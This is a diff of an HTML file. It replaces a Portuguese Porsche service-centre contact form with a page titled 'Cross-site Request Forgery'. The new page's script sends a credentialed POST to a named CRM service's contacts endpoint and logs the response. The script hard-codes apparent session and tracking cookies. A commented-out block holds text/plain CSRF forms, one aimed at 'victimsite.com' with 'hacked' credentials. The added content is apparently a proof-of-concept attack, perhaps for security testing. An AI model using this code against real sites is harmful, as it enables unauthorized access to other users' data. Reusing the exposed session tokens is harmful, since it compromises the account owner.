@@ -1,227 +1,52 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Document</title>
-  </head>
-  <body>
-    <script
-      type="text/javascript"
-      async
-      src="https://d335luupugsy2.cloudfront.net/js/loader-scripts/ca50227f-f386-4ad0-bea1-fa888ad421ca-loader.js"
-    ></script>
-    <form
-      class="p-8 lg:p-10 lg:w-1/2 rounded bg-white shadow-elevation-1"
-      _lpchecked="1"
-    >
-      <h3 class="leading-tight text-3xl md:text-4xl lg:text-4xl">
-        Garanta serviços aprovados pela Porsche
-      </h3>
-      <p class="mt-2">
-        Fale rapidamente com a gente sobre o serviço que seu carro precisa
-      </p>
-      <div class="flex flex-wrap my-5">
-        <div class="field w-full mb-5 lg:w-auto lg:mb-0 lg:flex-1 lg:mr-2">
-          <label for="name-field" class="block mb-2">Nome</label
-          ><input
-            id="name-field"
-            name="name-field"
-            placeholder="Seu nome"
-            required="required"
-            class="block w-full border px-5 focus:border-grey-9 focus:outline-none border-grey-3"
-            style="
-              background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABHklEQVQ4EaVTO26DQBD1ohQWaS2lg9JybZ+AK7hNwx2oIoVf4UPQ0Lj1FdKktevIpel8AKNUkDcWMxpgSaIEaTVv3sx7uztiTdu2s/98DywOw3Dued4Who/M2aIx5lZV1aEsy0+qiwHELyi+Ytl0PQ69SxAxkWIA4RMRTdNsKE59juMcuZd6xIAFeZ6fGCdJ8kY4y7KAuTRNGd7jyEBXsdOPE3a0QGPsniOnnYMO67LgSQN9T41F2QGrQRRFCwyzoIF2qyBuKKbcOgPXdVeY9rMWgNsjf9ccYesJhk3f5dYT1HX9gR0LLQR30TnjkUEcx2uIuS4RnI+aj6sJR0AM8AaumPaM/rRehyWhXqbFAA9kh3/8/NvHxAYGAsZ/il8IalkCLBfNVAAAAABJRU5ErkJggg==');
-              background-repeat: no-repeat;
-              background-attachment: scroll;
-              background-size: 16px 18px;
-              background-position: 98% 50%;
-              cursor: auto;
-            "
-          />
-        </div>
-        <div class="field w-full lg:w-auto lg:flex-1 lg:ml-2">
-          <label class="block mb-2">Telefone</label
-          ><input
-            id="phone-field"
-            name="phone-field"
-            placeholder="(00) 90000-0000"
-            required="required"
-            class="block w-full border px-5 border-grey-3 focus:border-grey-9 focus:outline-none"
-          />
-        </div>
-      </div>
-      <div class="field mb-5">
-        <label for="email-field" class="block mb-2">E-mail</label
-        ><input
-          id="email-field"
-          name="email-field"
-          placeholder="Digite seu e-mail"
-          type="email"
-          required="required"
-          class="block w-full border px-5 focus:border-grey-9 focus:outline-none border-grey-3"
-        />
-      </div>
-      <div class="field mb-5">
-        <label for="model-field" class="block">Modelo do veículo</label>
-        <div dir="auto" class="v-select vs--single vs--unsearchable">
-          <div
-            id="vs1__combobox"
-            role="combobox"
-            aria-expanded="false"
-            aria-owns="vs1__listbox"
-            aria-label="Search for option"
-            class="vs__dropdown-toggle"
-          >
-            <div class="vs__selected-options">
-              <span class="vs__selected">
-                Todos os modelos
-                <!----></span
-              >
-              <input
-                readonly="readonly"
-                aria-autocomplete="list"
-                aria-labelledby="vs1__combobox"
-                aria-controls="vs1__listbox"
-                type="search"
-                autocomplete="off"
-                value=""
-                class="vs__search"
-              />
-            </div>
-            <div class="vs__actions">
-              <button
-                type="button"
-                title="Clear Selected"
-                aria-label="Clear Selected"
-                class="vs__clear"
-                style=""
-              >
-                <span class="deselect"></span>
-              </button>
-              <span
-                role="presentation"
-                class="open-indicator vs__open-indicator"
-                ></span
-              >
-              <div class="vs__spinner" style="display: none">Loading...</div>
-            </div>
-          </div>
-          <ul
-            id="vs1__listbox"
-            role="listbox"
-            style="display: none; visibility: hidden"
-            class=""
-          ></ul>
-        </div>
-      </div>
-      <!---->
-      <div class="field mb-5">
-        <label for="sevices-field" class="block"
-          >Tipo de serviço que você deseja</label
-        >
-        <div dir="auto" class="v-select vs--single vs--unsearchable">
-          <div
-            id="vs2__combobox"
-            role="combobox"
-            aria-expanded="false"
-            aria-owns="vs2__listbox"
-            aria-label="Search for option"
-            class="vs__dropdown-toggle"
-          >
-            <div class="vs__selected-options">
-              <span class="vs__selected">
-                Alinhamento e balanceamento
-                <!----></span
-              >
-              <input
-                readonly="readonly"
-                aria-autocomplete="list"
-                aria-labelledby="vs2__combobox"
-                aria-controls="vs2__listbox"
-                type="search"
-                autocomplete="off"
-                value=""
-                class="vs__search"
-              />
-            </div>
-            <div class="vs__actions">
-              <button
-                type="button"
-                title="Clear Selected"
-                aria-label="Clear Selected"
-                class="vs__clear"
-                style=""
-              >
-                <span class="deselect"></span>
-              </button>
-              <span
-                role="presentation"
-                class="open-indicator vs__open-indicator"
-                ></span
-              >
-              <div class="vs__spinner" style="display: none">Loading...</div>
-            </div>
-          </div>
-          <ul
-            id="vs2__listbox"
-            role="listbox"
-            style="display: none; visibility: hidden"
-          ></ul>
-        </div>
-      </div>
-      <!----><!----><!----><!---->
-      <div class="text-field mb-5">
-        <label for="message-field" class="block"
-          >Com o que podemos ajudar?</label
-        ><textarea
-          id="message-field"
-          name="message-field"
-          placeholder="Escreva aqui o você procura…"
-          rows="4"
-          class="block w-full border px-5 py-3 focus:border-grey-9 focus:outline-none border-grey-3"
-        ></textarea>
-      </div>
-      <p class="mb-2">Deseja receber mais informações por e-mail?</p>
-      <label for="contact-check-field-1" class="checkbox mb-5"
-        ><input
-          id="contact-check-field-1"
-          type="checkbox"
-          name="contact-check-field"
-          value="true"
-        />
-        <div class="box"></div>
-        <span>Sim</span></label
-      ><label for="terms-check-field-1" class="checkbox mb-5"
-        ><input
-          id="terms-check-field-1"
-          type="checkbox"
-          name="terms-check-field"
-          value="true"
-          required="required"
-        />
-        <div class="box"></div>
-        <span
-          >Autorizo o Centro Técnico Porsche Itanhangá a me contatar para
-          oferecer produtos e serviços, utilizando minhas informações conforme
-          detalhado no Política de Privacidade.</span
-        ></label
-      ><button
-        type="submit"
-        class="button inline-flex items-center justify-center pl-10 pr-5 py-4 leading-none w-full justify-center bg-grey-2 text-grey-4 hover:bg-grey-1 cursor-not-allowed"
-        disabled="disabled"
-      >
-        Confirmar interesse
-      </button>
-      <div>
-        <h3 class="mt-8 leading-tight text-3xl md:text-4xl lg:text-4xl">
-          Agradecemos pelo interesse!
-        </h3>
-        <p class="mt-2">
-          Recebemos suas informações e, em breve, um de nossos especialistas
-          entrará em contato para conversar.
-        </p>
-      </div>
-    </form>
-  </body>
+<html>
+<head>
+  <title>Cross-site Request Forgery</title>
+</head>
+<body>
+  <h1>Cross-site Request Forgery</h1>
+
+  <script>
+
+    const data = "{\"must_not\":[],\"filters\":[],\"sort\":{\"name\":{\"order\":\"asc\"}},\"from\":0,\"done\":false}";
+
+      const xhr = new XMLHttpRequest();
+      xhr.withCredentials = true;
+      xhr.addEventListener("readystatechange", function () {
+        if (this.readyState === 4) {
+          console.log(this.responseText);
+        }
+      });
+      xhr.open("POST", "https://plugcrm.net/filters/contacts");
+      xhr.setRequestHeader("authority", "plugcrm.net");
+      xhr.setRequestHeader("accept", "application/json, text/plain, */*");
+      xhr.setRequestHeader("x-newrelic-id", "VgIAUFVbABADUVBQAQkCUlc=");
+      xhr.setRequestHeader("x-requested-with", "XMLHttpRequest");
+      xhr.setRequestHeader("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36");
+      xhr.setRequestHeader("content-type", "application/json;charset=UTF-8");
+      xhr.setRequestHeader("sec-gpc", "1");
+      xhr.setRequestHeader("origin", "https://plugcrm.net");
+      xhr.setRequestHeader("sec-fetch-site", "same-origin");
+      xhr.setRequestHeader("sec-fetch-mode", "cors");
+      xhr.setRequestHeader("sec-fetch-dest", "empty");
+      xhr.setRequestHeader("referer", "https://plugcrm.net/app");
+      xhr.setRequestHeader("accept-language", "en-US,en;q=0.9");
+      xhr.setRequestHeader("cookie", "ajs_user_id=%22606f6416eb0af400145c0eac%22; ajs_anonymous_id=%22d913b58c-12d3-47d2-aca1-5adf723fd529%22; _ga=GA1.2.861848365.1618255790; _gid=GA1.2.1437456234.1618255790; _fbp=fb.1.1618255791117.2054184733; _hjid=c2b97470-0161-4b28-a10e-2a70d1079e43; _session_id=9ff112b3a2d9020c2332369956069290; _psrm=rr; _hjIncludedInSessionSample=1; _hjAbsoluteSessionInProgress=0; _gat_UA-49588336-3=1; intercom-session-bn68yqvj=dms1N25DaGkyRDRoTm5CWjB6bjVKblowVnpaTDcyUHRZYkFNczBxNURJWitta1JRemh5MDRncHJteWs3MklZby0tMFNsZll5RkhUNDdyQnRNaHhLVDQzZz09--ee906b1431328be2045dbde79e70b7cb9108e6ca");
+      xhr.send(data);
+
+  </script>
+<!--
+<script>history.pushState('', '', '/')</script>
+<form action='http://victimsite.com' method='POST' enctype='text/plain'>
+  <input type='hidden' name='{"name":"hacked","password":"hacked","padding":"' value='something"}' />
+  <input type='submit' value='Submit request' />
+</form>
+
+  <form action=" https://plugcrm.net/filters/contacts" method="POST" enctype='text/plain'>
+      <input type='hidden'
+        name='{""}'
+      />
+      <input type="submit" value="Submit request">
+  </form> -->
+</body>
 </html>
